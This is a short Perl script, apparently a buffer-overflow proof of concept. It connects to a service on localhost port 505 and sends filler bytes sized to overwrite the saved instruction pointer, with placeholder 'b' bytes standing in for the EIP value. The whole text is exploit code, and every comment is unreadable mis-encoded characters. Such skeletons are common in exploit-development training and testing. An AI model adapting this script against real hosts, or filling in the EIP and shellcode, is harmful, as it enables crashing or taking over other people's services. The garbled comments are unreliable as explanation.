use strict;
use Socket;
# ������������ ��������
my $bufff = "\x61" x54;
my $eip = "\x62" x4;
my $buffff = "\x63" x20;
# ����� � ���� ��������� �������
my $host =  '127.0.0.1';
my $port =  505;
my $proto = getprotobyname('tcp');
# �������������� ������ � �������� ���
my $iaddr = inet_aton($host);
# ��������
my $paddr = sockaddr_in($port, $iaddr);
print "Setting up socket\n";
# �������� ������, ����������� � ��������� �����
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "Sending payload\n";
print SOCKET $bufff.$eip.$buffff."\n";
print "Payload sent\n";
close SOCKET or die "close: $!";
